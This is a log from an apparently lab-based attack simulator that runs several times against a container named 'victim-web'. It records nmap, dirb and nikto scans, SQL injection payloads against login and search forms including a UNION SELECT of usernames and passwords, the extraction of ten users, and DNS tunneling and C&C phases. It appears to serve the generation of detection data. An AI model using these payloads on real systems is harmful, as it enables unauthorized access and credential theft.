2025-07-23 19:17:29,627 - INFO - 🚀 Starting Enhanced Container-based SQL Injection Attack
2025-07-23 19:17:29,627 - INFO - Container ID: attacker
2025-07-23 19:17:29,627 - INFO - Target: http://victim-web:80
2025-07-23 19:17:29,627 - INFO - Attack Type: sql_injection
2025-07-23 19:17:29,627 - INFO - Variant ID: None
2025-07-23 19:17:29,628 - INFO - Benign Only: False
2025-07-23 19:17:29,628 - INFO - ============================================================
2025-07-23 19:17:29,628 - INFO - === Testing Container Connectivity ===
2025-07-23 19:17:29,631 - INFO - [+] Successfully connected to http://victim-web:80
2025-07-23 19:17:29,631 - INFO - [CONTAINER] connectivity_test: {'status': 'success', 'status_code': 200}
2025-07-23 19:17:29,631 - INFO - === Network Reconnaissance Phase ===
2025-07-23 19:17:29,631 - INFO - Running: nmap -sS -p- victim-web
2025-07-23 19:17:30,358 - INFO - [+] Nmap scan completed with return code: 0
2025-07-23 19:17:35,362 - INFO - === Web Application Enumeration Phase ===
2025-07-23 19:17:35,363 - INFO - Running: dirb http://victim-web:80 /usr/share/dirb/wordlists/common.txt -S -r
2025-07-23 19:17:36,352 - INFO - [+] Dirb scan completed with return code: 0
2025-07-23 19:17:36,353 - INFO - Running: nikto -h http://victim-web:80 -Format txt -o /opt/output/nikto_results.txt
2025-07-23 19:17:43,517 - INFO - [+] Nikto scan completed with return code: 0
2025-07-23 19:17:48,519 - INFO - === Custom SQL Injection Phase ===
2025-07-23 19:17:48,520 - INFO - [+] Custom Login Attack 1: admin' --
2025-07-23 19:17:48,541 - INFO -     Status: 200, SQL Error: False, Success: True
2025-07-23 19:17:51,398 - INFO - [+] Custom Login Attack 2: admin' OR '1'='1
2025-07-23 19:17:51,407 - INFO -     Status: 200, SQL Error: False, Success: True
2025-07-23 19:17:52,471 - INFO - [+] Custom Login Attack 3: ' OR 1=1--
2025-07-23 19:17:52,479 - INFO -     Status: 200, SQL Error: False, Success: True
2025-07-23 19:17:54,589 - INFO - [+] Custom Login Attack 4: ' UNION SELECT 1,2,3--
2025-07-23 19:17:54,594 - INFO -     Status: 200, SQL Error: True, Success: False
2025-07-23 19:17:56,813 - INFO - [+] Custom Login Attack 5: admin'/*
2025-07-23 19:17:56,823 - INFO -     Status: 200, SQL Error: False, Success: True
2025-07-23 19:17:59,061 - INFO - [+] Custom Login Attack 6: ' OR 'x'='x
2025-07-23 19:17:59,072 - INFO -     Status: 200, SQL Error: False, Success: False
2025-07-23 19:18:01,745 - INFO - [+] Custom Search Attack 1: ' OR 1=1--
2025-07-23 19:18:01,757 - INFO -     Status: 200, SQL Error: False, Time-based: False
2025-07-23 19:18:04,571 - INFO - [+] Custom Search Attack 2: ' UNION SELECT 1,2,3,4,5--
2025-07-23 19:18:04,580 - INFO -     Status: 200, SQL Error: False, Time-based: False
2025-07-23 19:18:06,648 - INFO - [+] Custom Search Attack 3: ' AND (SELECT COUNT(*) FROM users)>0--
2025-07-23 19:18:06,658 - INFO -     Status: 200, SQL Error: False, Time-based: False
2025-07-23 19:18:09,418 - INFO - [+] Custom Search Attack 4: ' AND (SELECT SLEEP(3))--
2025-07-23 19:18:09,429 - INFO -     Status: 200, SQL Error: False, Time-based: False
2025-07-23 19:18:10,441 - INFO - [+] Custom Search Attack 5: ' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version),0x7e),1)--
2025-07-23 19:18:10,443 - INFO -     Status: 200, SQL Error: False, Time-based: False
2025-07-23 19:18:17,526 - INFO - === Data Extraction Phase ===
2025-07-23 19:18:17,537 - INFO -     Found 1 columns in search query
2025-07-23 19:18:17,537 - INFO - Attempting data extraction (Method 1): ' UNION SELECT 1,username,password,email,role FROM users--
2025-07-23 19:18:17,543 - INFO -     Status: 200, Success: True
2025-07-23 19:18:17,568 - INFO - Attempting data extraction (Method 2.1): OFFSET 0
2025-07-23 19:18:17,571 - INFO -     Found user: admin
2025-07-23 19:18:18,573 - INFO - Attempting data extraction (Method 2.2): OFFSET 1
2025-07-23 19:18:18,585 - INFO -     Found user: alice
2025-07-23 19:18:19,588 - INFO - Attempting data extraction (Method 2.3): OFFSET 2
2025-07-23 19:18:19,597 - INFO -     Found user: bob
2025-07-23 19:18:20,598 - INFO - Attempting data extraction (Method 2.4): OFFSET 3
2025-07-23 19:18:20,601 - INFO -     Found user: guest
2025-07-23 19:18:21,603 - INFO - Attempting data extraction (Method 2.5): OFFSET 4
2025-07-23 19:18:21,617 - INFO -     Found user: john
2025-07-23 19:18:22,619 - INFO - Attempting data extraction (Method 2.6): OFFSET 5
2025-07-23 19:18:22,628 - INFO -     Found user: manager
2025-07-23 19:18:23,631 - INFO - Attempting data extraction (Method 2.7): OFFSET 6
2025-07-23 19:18:23,641 - INFO -     Found user: test
2025-07-23 19:18:24,642 - INFO - Attempting data extraction (Method 2.8): OFFSET 7
2025-07-23 19:18:24,657 - INFO -     Found user: user1
2025-07-23 19:18:25,658 - INFO - Attempting data extraction (Method 2.9): OFFSET 8
2025-07-23 19:18:25,661 - INFO -     Found user: user1
2025-07-23 19:18:26,663 - INFO - Attempting data extraction (Method 2.10): OFFSET 9
2025-07-23 19:18:26,673 - INFO -     Found user: test
2025-07-23 19:18:27,679 - INFO - [+] Extracted 10 users, saved to /opt/output/extracted_data.html
2025-07-23 19:18:27,680 - INFO - === DNS Attack Phase ===
2025-07-23 19:18:27,681 - INFO - Generating DNS proxy logs...
2025-07-23 19:18:27,683 - INFO - Generated 5 DNS proxy log entries
2025-07-23 19:18:27,685 - INFO - Generating HTTP proxy logs...
2025-07-23 19:18:27,686 - INFO - Generated 5 HTTP proxy log entries
2025-07-23 19:18:27,687 - INFO - DNS Attack Configuration: {'enabled': True, 'phases': ['reconnaissance', 'brute_force', 'tunneling', 'cc_communication'], 'intensity': 'low', 'delay_between_queries': '2-5', 'subdomain_wordlist_size': 40}
2025-07-23 19:18:27,687 - ERROR - DNS attack phase failed: __init__() missing 1 required positional argument: 'target_domain'
2025-07-23 19:18:27,687 - INFO - === Saving Attack Results ===
2025-07-23 19:18:27,688 - INFO - [+] Scan results saved to /opt/output/scan_results.json
2025-07-23 19:18:27,689 - INFO - [+] SQL injection results saved to /opt/output/sql_injection_results.json
2025-07-23 19:18:27,690 - INFO - [+] Container attack log saved to /opt/output/container_attack_log.json
2025-07-23 19:18:27,690 - INFO - [+] Detailed attack summary saved to /opt/output/attack_summary.txt
2025-07-23 19:18:27,691 - INFO - 
[ATTACK_END] 2025-07-23T19:18:27.687600
2025-07-23 19:18:27,691 - INFO - 
✅ Enhanced container attack completed!
2025-07-23 19:18:27,692 - INFO - Check the following for attack data:
2025-07-23 19:18:27,692 - INFO - - Container logs: docker logs securitylogs-attacker
2025-07-23 19:18:27,692 - INFO - - Attack log: /opt/output/container_attack_log.json
2025-07-23 19:18:27,692 - INFO - - Scan results: /opt/output/scan_results.json
2025-07-23 19:18:27,693 - INFO - - SQL injection results: /opt/output/sql_injection_results.json
2025-07-23 19:18:27,693 - INFO - - Attack summary: /opt/output/attack_summary.txt
2025-07-23 19:18:27,693 - INFO - - Extracted data: /opt/output/extracted_data.html
2025-07-23 23:12:35,254 - INFO - 🚀 Starting Enhanced Container-based SQL Injection Attack
2025-07-23 23:12:35,254 - INFO - Container ID: attacker
2025-07-23 23:12:35,255 - INFO - Target: http://victim-web:80
2025-07-23 23:12:35,255 - INFO - Attack Type: sql_injection
2025-07-23 23:12:35,255 - INFO - Variant ID: None
2025-07-23 23:12:35,255 - INFO - Benign Only: False
2025-07-23 23:12:35,255 - INFO - ============================================================
2025-07-23 23:12:35,255 - INFO - === Testing Container Connectivity ===
2025-07-23 23:12:35,259 - INFO - [+] Successfully connected to http://victim-web:80
2025-07-23 23:12:35,259 - INFO - [CONTAINER] connectivity_test: {'status': 'success', 'status_code': 200}
2025-07-23 23:12:35,260 - INFO - === Network Reconnaissance Phase ===
2025-07-23 23:12:35,260 - INFO - Running: nmap -sS -p- victim-web
2025-07-23 23:12:36,159 - INFO - [+] Nmap scan completed with return code: 0
2025-07-23 23:12:41,166 - INFO - === Web Application Enumeration Phase ===
2025-07-23 23:12:41,166 - INFO - Running: dirb http://victim-web:80 /usr/share/dirb/wordlists/common.txt -S -r
2025-07-23 23:12:42,372 - INFO - [+] Dirb scan completed with return code: 0
2025-07-23 23:12:42,372 - INFO - Running: nikto -h http://victim-web:80 -Format txt -o /opt/output/nikto_results.txt
2025-07-23 23:12:49,632 - INFO - [+] Nikto scan completed with return code: 0
2025-07-23 23:12:54,638 - INFO - === Custom SQL Injection Phase ===
2025-07-23 23:12:54,638 - INFO - [+] Custom Login Attack 1: admin' --
2025-07-23 23:12:54,654 - INFO -     Status: 200, SQL Error: False, Success: True
2025-07-23 23:12:57,154 - INFO - [+] Custom Login Attack 2: admin' OR '1'='1
2025-07-23 23:12:57,177 - INFO -     Status: 200, SQL Error: False, Success: True
2025-07-23 23:12:58,373 - INFO - [+] Custom Login Attack 3: ' OR 1=1--
2025-07-23 23:12:58,393 - INFO -     Status: 200, SQL Error: False, Success: True
2025-07-23 23:13:01,230 - INFO - [+] Custom Login Attack 4: ' UNION SELECT 1,2,3--
2025-07-23 23:13:01,232 - INFO -     Status: 200, SQL Error: True, Success: False
2025-07-23 23:13:03,644 - INFO - [+] Custom Login Attack 5: admin'/*
2025-07-23 23:13:03,654 - INFO -     Status: 200, SQL Error: False, Success: True
2025-07-23 23:13:06,221 - INFO - [+] Custom Login Attack 6: ' OR 'x'='x
2025-07-23 23:13:06,223 - INFO -     Status: 200, SQL Error: False, Success: False
2025-07-23 23:13:08,681 - INFO - [+] Custom Search Attack 1: ' OR 1=1--
2025-07-23 23:13:08,694 - INFO -     Status: 200, SQL Error: False, Time-based: False
2025-07-23 23:13:11,112 - INFO - [+] Custom Search Attack 2: ' UNION SELECT 1,2,3,4,5--
2025-07-23 23:13:11,122 - INFO -     Status: 200, SQL Error: False, Time-based: False
2025-07-23 23:13:12,460 - INFO - [+] Custom Search Attack 3: ' AND (SELECT COUNT(*) FROM users)>0--
2025-07-23 23:13:12,471 - INFO -     Status: 200, SQL Error: False, Time-based: False
2025-07-23 23:13:13,702 - INFO - [+] Custom Search Attack 4: ' AND (SELECT SLEEP(3))--
2025-07-23 23:13:13,712 - INFO -     Status: 200, SQL Error: False, Time-based: False
2025-07-23 23:13:14,884 - INFO - [+] Custom Search Attack 5: ' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version),0x7e),1)--
2025-07-23 23:13:14,901 - INFO -     Status: 200, SQL Error: False, Time-based: False
2025-07-23 23:13:22,812 - INFO - === Data Extraction Phase ===
2025-07-23 23:13:22,823 - INFO -     Found 1 columns in search query
2025-07-23 23:13:22,824 - INFO - Attempting data extraction (Method 1): ' UNION SELECT 1,username,password,email,role FROM users--
2025-07-23 23:13:22,830 - INFO -     Status: 200, Success: True
2025-07-23 23:13:22,860 - INFO - Attempting data extraction (Method 2.1): OFFSET 0
2025-07-23 23:13:22,864 - INFO -     Found user: admin
2025-07-23 23:13:23,865 - INFO - Attempting data extraction (Method 2.2): OFFSET 1
2025-07-23 23:13:23,870 - INFO -     Found user: alice
2025-07-23 23:13:24,873 - INFO - Attempting data extraction (Method 2.3): OFFSET 2
2025-07-23 23:13:24,882 - INFO -     Found user: bob
2025-07-23 23:13:25,888 - INFO - Attempting data extraction (Method 2.4): OFFSET 3
2025-07-23 23:13:25,902 - INFO -     Found user: guest
2025-07-23 23:13:26,904 - INFO - Attempting data extraction (Method 2.5): OFFSET 4
2025-07-23 23:13:26,914 - INFO -     Found user: john
2025-07-23 23:13:27,916 - INFO - Attempting data extraction (Method 2.6): OFFSET 5
2025-07-23 23:13:27,924 - INFO -     Found user: manager
2025-07-23 23:13:28,926 - INFO - Attempting data extraction (Method 2.7): OFFSET 6
2025-07-23 23:13:28,940 - INFO -     Found user: test
2025-07-23 23:13:29,946 - INFO - Attempting data extraction (Method 2.8): OFFSET 7
2025-07-23 23:13:29,958 - INFO -     Found user: user1
2025-07-23 23:13:30,961 - INFO - Attempting data extraction (Method 2.9): OFFSET 8
2025-07-23 23:13:30,970 - INFO -     Found user: user1
2025-07-23 23:13:31,972 - INFO - Attempting data extraction (Method 2.10): OFFSET 9
2025-07-23 23:13:31,982 - INFO -     Found user: test
2025-07-23 23:13:32,986 - INFO - [+] Extracted 10 users, saved to /opt/output/extracted_data.html
2025-07-23 23:13:32,989 - INFO - === DNS Attack Phase ===
2025-07-23 23:13:32,989 - INFO - Generating DNS proxy logs with attack traffic...
2025-07-23 23:14:06,789 - INFO - Generated 22 DNS attack log entries
2025-07-23 23:14:06,793 - INFO - DNS attack logs appended to /opt/output/proxy/dns_proxy_raw.jsonl
2025-07-23 23:14:06,793 - INFO - Generating HTTP proxy logs...
2025-07-23 23:14:06,801 - INFO - Generated 5 HTTP proxy log entries
2025-07-23 23:14:06,804 - INFO - DNS Attack Configuration: {'enabled': True, 'phases': ['reconnaissance', 'brute_force', 'tunneling', 'cc_communication'], 'intensity': 'low', 'delay_between_queries': '2-5', 'subdomain_wordlist_size': 40}
2025-07-23 23:14:06,806 - ERROR - DNS attack phase failed: __init__() missing 1 required positional argument: 'target_domain'
2025-07-23 23:14:06,806 - INFO - === Saving Attack Results ===
2025-07-23 23:14:06,809 - INFO - [+] Scan results saved to /opt/output/scan_results.json
2025-07-23 23:14:06,811 - INFO - [+] SQL injection results saved to /opt/output/sql_injection_results.json
2025-07-23 23:14:06,812 - INFO - [+] Container attack log saved to /opt/output/container_attack_log.json
2025-07-23 23:14:06,813 - INFO - [+] Detailed attack summary saved to /opt/output/attack_summary.txt
2025-07-23 23:14:06,814 - INFO - 
[ATTACK_END] 2025-07-23T23:14:06.806555
2025-07-23 23:14:06,814 - INFO - 
✅ Enhanced container attack completed!
2025-07-23 23:14:06,814 - INFO - Check the following for attack data:
2025-07-23 23:14:06,814 - INFO - - Container logs: docker logs securitylogs-attacker
2025-07-23 23:14:06,814 - INFO - - Attack log: /opt/output/container_attack_log.json
2025-07-23 23:14:06,814 - INFO - - Scan results: /opt/output/scan_results.json
2025-07-23 23:14:06,814 - INFO - - SQL injection results: /opt/output/sql_injection_results.json
2025-07-23 23:14:06,814 - INFO - - Attack summary: /opt/output/attack_summary.txt
2025-07-23 23:14:06,815 - INFO - - Extracted data: /opt/output/extracted_data.html
2025-07-23 23:25:59,797 - INFO - === DNS Attack Phase ===
2025-07-23 23:25:59,797 - INFO - Generating DNS proxy logs with attack traffic...
2025-07-23 23:26:36,121 - INFO - Generated 22 DNS attack log entries
2025-07-23 23:26:36,124 - INFO - DNS attack logs appended to /opt/output/proxy/dns_proxy_raw.jsonl
2025-07-23 23:26:36,124 - INFO - Generating HTTP proxy logs...
2025-07-23 23:26:36,126 - INFO - Generated 5 HTTP proxy log entries
2025-07-23 23:26:36,127 - WARNING - DNS attack module not available, skipping DNS attacks
2025-07-23 23:27:13,924 - INFO - === DNS Attack Phase ===
2025-07-23 23:27:13,924 - INFO - Generating DNS proxy logs with attack traffic...
2025-07-23 23:27:49,069 - INFO - Generated 22 DNS attack log entries
2025-07-23 23:27:49,069 - INFO - DNS attack logs appended to /opt/output/proxy/dns_proxy_raw.jsonl
2025-07-23 23:27:49,069 - INFO - Generating HTTP proxy logs...
2025-07-23 23:27:49,070 - INFO - Generated 5 HTTP proxy log entries
2025-07-23 23:27:49,070 - WARNING - DNS attack module not available, skipping DNS attacks
2025-07-23 23:50:42,962 - INFO - === DNS Attack Phase ===
2025-07-23 23:50:42,962 - INFO - Generating DNS proxy logs with attack traffic...
2025-07-23 23:51:16,820 - INFO - Generated 22 DNS attack log entries
2025-07-23 23:51:16,822 - INFO - DNS attack logs appended to /opt/output/proxy/dns_proxy_raw.jsonl
2025-07-23 23:51:16,822 - INFO - Generating HTTP proxy logs...
2025-07-23 23:51:16,829 - INFO - Generated 5 HTTP proxy log entries
2025-07-23 23:51:16,833 - WARNING - DNS attack module not available, skipping DNS attacks
2025-07-23 23:51:52,993 - INFO - === DNS Attack Phase ===
2025-07-23 23:51:52,994 - INFO - Generating DNS proxy logs with attack traffic...
2025-07-23 23:52:24,646 - INFO - Generated 22 DNS attack log entries
2025-07-23 23:52:24,650 - INFO - DNS attack logs appended to /opt/output/proxy/dns_proxy_raw.jsonl
2025-07-23 23:52:24,650 - INFO - Generating HTTP proxy logs...
2025-07-23 23:52:24,652 - INFO - Generated 5 HTTP proxy log entries
2025-07-23 23:52:24,653 - INFO - DNS Attack Configuration: {'enabled': True, 'target_domain': 'victim-web.local', 'phases': ['reconnaissance', 'brute_force', 'tunneling', 'cc_communication'], 'intensity': 'low', 'delay_between_queries': '2-5', 'subdomain_wordlist_size': 40}
2025-07-23 23:52:24,653 - INFO - Executing DNS reconnaissance...
2025-07-23 23:52:24,653 - ERROR - DNS attack phase failed: dns_reconnaissance() takes 1 positional argument but 2 were given
2025-07-23 23:53:11,368 - INFO - === DNS Attack Phase ===
2025-07-23 23:53:11,368 - INFO - Generating DNS proxy logs with attack traffic...
2025-07-23 23:53:45,892 - INFO - Generated 22 DNS attack log entries
2025-07-23 23:53:45,893 - INFO - DNS attack logs appended to /opt/output/proxy/dns_proxy_raw.jsonl
2025-07-23 23:53:45,893 - INFO - Generating HTTP proxy logs...
2025-07-23 23:53:45,901 - INFO - Generated 5 HTTP proxy log entries
2025-07-23 23:53:45,902 - INFO - DNS Attack Configuration: {'enabled': True, 'target_domain': 'victim-web.local', 'phases': ['reconnaissance', 'brute_force', 'tunneling', 'cc_communication'], 'intensity': 'low', 'delay_between_queries': '2-5', 'subdomain_wordlist_size': 40}
2025-07-23 23:53:45,902 - INFO - Executing DNS reconnaissance...
2025-07-23 23:53:50,214 - INFO - Executing DNS brute force...
2025-07-23 23:53:54,048 - INFO - Executing DNS tunneling...
2025-07-23 23:53:57,080 - INFO - Executing C&C communication...
2025-07-23 23:53:57,081 - ERROR - DNS attack phase failed: 'DNSAttackModule' object has no attribute 'cc_communication'
2025-07-23 23:54:54,863 - INFO - === DNS Attack Phase ===
2025-07-23 23:54:54,863 - INFO - Generating DNS proxy logs with attack traffic...
2025-07-23 23:55:25,663 - INFO - Generated 22 DNS attack log entries
2025-07-23 23:55:25,664 - INFO - DNS attack logs appended to /opt/output/proxy/dns_proxy_raw.jsonl
2025-07-23 23:55:25,664 - INFO - Generating HTTP proxy logs...
2025-07-23 23:55:25,667 - INFO - Generated 5 HTTP proxy log entries
2025-07-23 23:55:25,668 - INFO - DNS Attack Configuration: {'enabled': True, 'target_domain': 'victim-web.local', 'phases': ['reconnaissance', 'brute_force', 'tunneling', 'cc_communication'], 'intensity': 'low', 'delay_between_queries': '2-5', 'subdomain_wordlist_size': 40}
2025-07-23 23:55:25,668 - INFO - Executing DNS reconnaissance...
2025-07-23 23:55:29,911 - INFO - Executing DNS brute force...
2025-07-23 23:55:32,159 - INFO - Executing DNS tunneling...
2025-07-23 23:55:34,677 - INFO - Executing C&C communication...
2025-07-23 23:55:34,678 - ERROR - DNS attack phase failed: 'DNSAttackModule' object has no attribute 'cc_communication'
2025-07-23 23:59:37,215 - INFO - === DNS Attack Phase ===
2025-07-23 23:59:37,215 - INFO - Generating DNS proxy logs with attack traffic...
2025-07-24 00:00:13,524 - INFO - Generated 22 DNS attack log entries
2025-07-24 00:00:13,527 - INFO - DNS attack logs appended to /opt/output/proxy/dns_proxy_raw.jsonl
2025-07-24 00:00:13,527 - INFO - Generating HTTP proxy logs...
2025-07-24 00:00:13,530 - INFO - Generated 5 HTTP proxy log entries
2025-07-24 00:00:13,530 - INFO - DNS Attack Configuration: {'enabled': True, 'target_domain': 'victim-web.local', 'phases': ['reconnaissance', 'brute_force', 'tunneling', 'cc_communication'], 'intensity': 'low', 'delay_between_queries': '2-5', 'subdomain_wordlist_size': 40}
2025-07-24 00:00:13,532 - INFO - Executing DNS reconnaissance...
2025-07-24 00:00:17,730 - INFO - Executing DNS brute force...
2025-07-24 00:00:20,001 - INFO - Executing DNS tunneling...
2025-07-24 00:00:22,731 - INFO - Executing C&C communication...
2025-07-24 00:00:22,732 - ERROR - DNS attack phase failed: dns_cc_communication() missing 1 required positional argument: 'command'
2025-07-24 00:00:45,097 - INFO - === DNS Attack Phase ===
2025-07-24 00:00:45,097 - INFO - Generating DNS proxy logs with attack traffic...
2025-07-24 00:01:24,426 - INFO - Generated 22 DNS attack log entries
2025-07-24 00:01:24,431 - INFO - DNS attack logs appended to /opt/output/proxy/dns_proxy_raw.jsonl
2025-07-24 00:01:24,431 - INFO - Generating HTTP proxy logs...
2025-07-24 00:01:24,437 - INFO - Generated 5 HTTP proxy log entries
2025-07-24 00:01:24,438 - INFO - DNS Attack Configuration: {'enabled': True, 'target_domain': 'victim-web.local', 'phases': ['reconnaissance', 'brute_force', 'tunneling', 'cc_communication'], 'intensity': 'low', 'delay_between_queries': '2-5', 'subdomain_wordlist_size': 40}
2025-07-24 00:01:24,438 - INFO - Executing DNS reconnaissance...
2025-07-24 00:01:29,333 - INFO - Executing DNS brute force...
2025-07-24 00:01:34,280 - INFO - Executing DNS tunneling...
2025-07-24 00:01:38,243 - INFO - Executing C&C communication...
2025-07-24 00:01:40,515 - INFO - DNS attack phase completed successfully
2025-07-24 00:06:51,149 - INFO - 🚀 Starting Enhanced Container-based SQL Injection Attack
2025-07-24 00:06:51,149 - INFO - Container ID: attacker
2025-07-24 00:06:51,149 - INFO - Target: http://victim-web:80
2025-07-24 00:06:51,149 - INFO - Attack Type: sql_injection
2025-07-24 00:06:51,149 - INFO - Variant ID: None
2025-07-24 00:06:51,150 - INFO - Benign Only: False
2025-07-24 00:06:51,150 - INFO - ============================================================
2025-07-24 00:06:51,150 - INFO - === Testing Container Connectivity ===
2025-07-24 00:06:51,154 - INFO - [+] Successfully connected to http://victim-web:80
2025-07-24 00:06:51,155 - INFO - [CONTAINER] connectivity_test: {'status': 'success', 'status_code': 200}
2025-07-24 00:06:51,155 - INFO - === Network Reconnaissance Phase ===
2025-07-24 00:06:51,155 - INFO - Running: nmap -sS -p- victim-web
2025-07-24 00:06:51,851 - INFO - [+] Nmap scan completed with return code: 0
2025-07-24 00:06:56,857 - INFO - === Web Application Enumeration Phase ===
2025-07-24 00:06:56,858 - INFO - Running: dirb http://victim-web:80 /usr/share/dirb/wordlists/common.txt -S -r
2025-07-24 00:06:57,938 - INFO - [+] Dirb scan completed with return code: 0
2025-07-24 00:06:57,939 - INFO - Running: nikto -h http://victim-web:80 -Format txt -o /opt/output/nikto_results.txt
2025-07-24 00:07:05,499 - INFO - [+] Nikto scan completed with return code: 0
2025-07-24 00:07:10,504 - INFO - === Custom SQL Injection Phase ===
2025-07-24 00:07:10,504 - INFO - [+] Custom Login Attack 1: admin' --
2025-07-24 00:07:10,514 - INFO -     Status: 200, SQL Error: False, Success: True
2025-07-24 00:07:12,107 - INFO - [+] Custom Login Attack 2: admin' OR '1'='1
2025-07-24 00:07:12,113 - INFO -     Status: 200, SQL Error: False, Success: True
2025-07-24 00:07:13,609 - INFO - [+] Custom Login Attack 3: ' OR 1=1--
2025-07-24 00:07:13,617 - INFO -     Status: 200, SQL Error: False, Success: True
2025-07-24 00:07:16,512 - INFO - [+] Custom Login Attack 4: ' UNION SELECT 1,2,3--
2025-07-24 00:07:16,520 - INFO -     Status: 200, SQL Error: True, Success: False
2025-07-24 00:07:17,788 - INFO - [+] Custom Login Attack 5: admin'/*
2025-07-24 00:07:17,794 - INFO -     Status: 200, SQL Error: False, Success: True
2025-07-24 00:07:19,669 - INFO - [+] Custom Login Attack 6: ' OR 'x'='x
2025-07-24 00:07:19,677 - INFO -     Status: 200, SQL Error: False, Success: False
2025-07-24 00:07:21,580 - INFO - [+] Custom Search Attack 1: ' OR 1=1--
2025-07-24 00:07:21,588 - INFO -     Status: 200, SQL Error: False, Time-based: False
2025-07-24 00:07:23,892 - INFO - [+] Custom Search Attack 2: ' UNION SELECT 1,2,3,4,5--
2025-07-24 00:07:23,901 - INFO -     Status: 200, SQL Error: False, Time-based: False
2025-07-24 00:07:25,915 - INFO - [+] Custom Search Attack 3: ' AND (SELECT COUNT(*) FROM users)>0--
2025-07-24 00:07:25,919 - INFO -     Status: 200, SQL Error: False, Time-based: False
2025-07-24 00:07:27,081 - INFO - [+] Custom Search Attack 4: ' AND (SELECT SLEEP(3))--
2025-07-24 00:07:27,083 - INFO -     Status: 200, SQL Error: False, Time-based: False
2025-07-24 00:07:28,782 - INFO - [+] Custom Search Attack 5: ' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version),0x7e),1)--
2025-07-24 00:07:28,794 - INFO -     Status: 200, SQL Error: False, Time-based: False
2025-07-24 00:07:34,891 - INFO - === Data Extraction Phase ===
2025-07-24 00:07:34,904 - INFO -     Found 1 columns in search query
2025-07-24 00:07:34,904 - INFO - Attempting data extraction (Method 1): ' UNION SELECT 1,username,password,email,role FROM users--
2025-07-24 00:07:34,914 - INFO -     Status: 200, Success: True
2025-07-24 00:07:34,931 - INFO - Attempting data extraction (Method 2.1): OFFSET 0
2025-07-24 00:07:34,935 - INFO -     Found user: admin
2025-07-24 00:07:35,937 - INFO - Attempting data extraction (Method 2.2): OFFSET 1
2025-07-24 00:07:35,947 - INFO -     Found user: alice
2025-07-24 00:07:36,950 - INFO - Attempting data extraction (Method 2.3): OFFSET 2
2025-07-24 00:07:36,961 - INFO -     Found user: bob
2025-07-24 00:07:37,966 - INFO - Attempting data extraction (Method 2.4): OFFSET 3
2025-07-24 00:07:37,978 - INFO -     Found user: guest
2025-07-24 00:07:38,981 - INFO - Attempting data extraction (Method 2.5): OFFSET 4
2025-07-24 00:07:38,990 - INFO -     Found user: john
2025-07-24 00:07:39,994 - INFO - Attempting data extraction (Method 2.6): OFFSET 5
2025-07-24 00:07:40,000 - INFO -     Found user: manager
2025-07-24 00:07:41,003 - INFO - Attempting data extraction (Method 2.7): OFFSET 6
2025-07-24 00:07:41,017 - INFO -     Found user: test
2025-07-24 00:07:42,020 - INFO - Attempting data extraction (Method 2.8): OFFSET 7
2025-07-24 00:07:42,033 - INFO -     Found user: user1
2025-07-24 00:07:43,035 - INFO - Attempting data extraction (Method 2.9): OFFSET 8
2025-07-24 00:07:43,039 - INFO -     Found user: user1
2025-07-24 00:07:44,046 - INFO - Attempting data extraction (Method 2.10): OFFSET 9
2025-07-24 00:07:44,052 - INFO -     Found user: test
2025-07-24 00:07:45,055 - INFO - [+] Extracted 10 users, saved to /opt/output/extracted_data.html
2025-07-24 00:07:45,055 - INFO - === DNS Attack Phase ===
2025-07-24 00:07:45,055 - INFO - Generating DNS proxy logs with attack traffic...
2025-07-24 00:08:23,268 - INFO - Generated 22 DNS attack log entries
2025-07-24 00:08:23,269 - INFO - DNS attack logs appended to /opt/output/proxy/dns_proxy_raw.jsonl
2025-07-24 00:08:23,270 - INFO - Generating HTTP proxy logs...
2025-07-24 00:08:23,271 - INFO - Generated 5 HTTP proxy log entries
2025-07-24 00:08:23,272 - INFO - DNS Attack Configuration: {'enabled': True, 'target_domain': 'victim-web.local', 'phases': ['reconnaissance', 'brute_force', 'tunneling', 'cc_communication'], 'intensity': 'low', 'delay_between_queries': '2-5', 'subdomain_wordlist_size': 40}
2025-07-24 00:08:23,273 - INFO - Executing DNS reconnaissance...
2025-07-24 00:08:26,291 - INFO - Executing DNS brute force...
2025-07-24 00:08:29,785 - INFO - Executing DNS tunneling...
2025-07-24 00:08:33,448 - INFO - Executing C&C communication...
2025-07-24 00:08:37,936 - INFO - DNS attack phase completed successfully
2025-07-24 00:08:37,937 - INFO - === Saving Attack Results ===
2025-07-24 00:08:37,938 - INFO - [+] Scan results saved to /opt/output/scan_results.json
2025-07-24 00:08:37,940 - INFO - [+] SQL injection results saved to /opt/output/sql_injection_results.json
2025-07-24 00:08:37,941 - INFO - [+] Container attack log saved to /opt/output/container_attack_log.json
2025-07-24 00:08:37,942 - INFO - [+] Detailed attack summary saved to /opt/output/attack_summary.txt
2025-07-24 00:08:37,942 - INFO - 
[ATTACK_END] 2025-07-24T00:08:37.937110
2025-07-24 00:08:37,942 - INFO - 
✅ Enhanced container attack completed!
2025-07-24 00:08:37,942 - INFO - Check the following for attack data:
2025-07-24 00:08:37,943 - INFO - - Container logs: docker logs securitylogs-attacker
2025-07-24 00:08:37,943 - INFO - - Attack log: /opt/output/container_attack_log.json
2025-07-24 00:08:37,943 - INFO - - Scan results: /opt/output/scan_results.json
2025-07-24 00:08:37,943 - INFO - - SQL injection results: /opt/output/sql_injection_results.json
2025-07-24 00:08:37,943 - INFO - - Attack summary: /opt/output/attack_summary.txt
2025-07-24 00:08:37,944 - INFO - - Extracted data: /opt/output/extracted_data.html
2025-07-24 00:10:57,117 - INFO - [+] Detailed attack summary saved to /opt/output/attack_summary.txt
2025-07-24 00:11:16,974 - INFO - === DNS Attack Phase ===
2025-07-24 00:11:16,975 - INFO - Generating DNS proxy logs with attack traffic...
2025-07-24 00:11:52,461 - INFO - Generated 22 DNS attack log entries
2025-07-24 00:11:52,462 - INFO - DNS attack logs appended to /opt/output/proxy/dns_proxy_raw.jsonl
2025-07-24 00:11:52,462 - INFO - Generating HTTP proxy logs...
2025-07-24 00:11:52,465 - INFO - Generated 5 HTTP proxy log entries
2025-07-24 00:11:52,465 - INFO - DNS Attack Configuration: {'enabled': True, 'target_domain': 'victim-web.local', 'phases': ['reconnaissance', 'brute_force', 'tunneling', 'cc_communication'], 'intensity': 'low', 'delay_between_queries': '2-5', 'subdomain_wordlist_size': 40}
2025-07-24 00:11:52,465 - INFO - Executing DNS reconnaissance...
2025-07-24 00:11:57,160 - INFO - Executing DNS brute force...
2025-07-24 00:12:00,322 - INFO - Executing DNS tunneling...
2025-07-24 00:12:04,463 - INFO - Executing C&C communication...
